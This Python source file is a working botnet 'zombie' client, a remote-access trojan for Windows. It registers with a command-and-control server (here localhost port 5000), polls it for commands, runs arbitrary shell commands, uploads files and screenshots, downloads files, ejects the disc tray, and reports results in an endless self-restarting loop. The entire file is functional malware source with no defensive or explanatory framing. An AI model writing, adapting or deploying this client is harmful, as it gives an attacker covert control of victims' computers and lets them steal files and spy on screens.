import urllib.request
import subprocess
import ast
import urllib.parse
from time import sleep
from PIL import ImageGrab
import requests

class Zombie:
    """ zombie class, hold all varaibles and functions of the zombie """
    def __init__(self):
        """ constructor """
        self.screenshot_id = 0
        self.guid  = self.get_guid()
        self.paths = {"add" : self.guid + '/add',
                      "remove" : self.guid + '/remove',
                      "sendcmd" : 'sendcmd/',
                      "getcmd" : self.guid + '/index.html',
                      "putfile" : self.guid + '/putfile/',
                      "getfile" : self.guid + '/getfile/',
                      "cmdlist" : self.guid + '/cmdlst'}

        self.url  = "http://127.0.0.1:5000/"
        self.cmds = []
        self.done = []

    def get_guid(self):
        return self.os("powershell.exe [guid]::newguid()").split("\r\n")[3]

    def add(self):
        """ add zombie to server """
        r = urllib.request.urlopen(self.url + self.paths["add"])

    def remove(self):
        """ remove zombie from server """
        r = urllib.request.urlopen(self.url + self.paths["remove"])
        exit()

    def get_cmd(self):
        """ get commands from server """
        r = urllib.request.urlopen(self.url + self.paths["getcmd"])
        r = r.read().decode("ascii")
        self.cmds = ast.literal_eval(r)
        if(self.cmds == []):
            sleep(5)
            self.get_cmd()

    def os(self, cmd):
        """ run os command """
        c = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
        (output, err) = c.communicate()
        output = output.decode("utf-8")
        return output

    def send_cmd(self):
        """ send done command list + output to server """
        params = {"lis" : self.done}
        query_string = urllib.parse.urlencode( params )
        data = query_string.encode( "ascii" )
        urllib.request.urlopen(self.url + self.paths["cmdlist"], data)

    def get_file(self, cmd):
        """ get file from server """
        r = urllib.request.urlopen(self.url + self.paths["getfile"] + cmd.split(" ")[1])
        r = r.read()
        f = open(cmd.split(" ")[1], "wb")
        f.write(r)
        f.close()

    def put_file(self, cmd):
        """ put file on server """
        file_name = cmd.split(" ")[1]
        files = {file_name : open(file_name, "rb")}
        requests.post(self.url + self.paths["putfile"] + file_name, files=files)

    def take_sshot(self):
        """ take screenshot """
        name = "s_" + str(self.screenshot_id) + ".jpg"
        ImageGrab.grab().save(name, "JPEG")
        self.put_file(" " + name)
        self.screenshot_id += 1

    def opendisc(self):
        subprocess.Popen('powershell (New-Object -com "WMPlayer.OCX.7").cdromcollection.item(0).eject()')

    def execute(self):
        """ execute command """
        cmd = self.cmds.pop()
        cmd, id = cmd[0], cmd[1]

        remove = ("remove" in cmd)
        getfile = ("getfile" in cmd)
        putfile = ("putfile" in cmd)
        screenshot = ("screenshot" in cmd)
        opendisc = ("opendisc" in cmd)

        if remove:
            self.remove()

        elif getfile:
            self.get_file(cmd)
            self.done.append([cmd ,id, "done!"])

        elif putfile:
            self.put_file(cmd)
            self.done.append([cmd ,id, "done!"])

        elif screenshot:
            self.take_sshot()
            self.done.append([cmd ,id, "done!"])

        elif opendisc:
            self.opendisc()
            self.done.append([cmd ,id, "done!"])

        else:
            out = self.os(cmd)
            self.done.append([cmd ,id, out])

z = Zombie()
z.add()
def main():
    while True:
        z.get_cmd()
        z.execute()
        z.send_cmd()
        sleep(5)

try:
    main()
except:
    sleep(5)
    main()
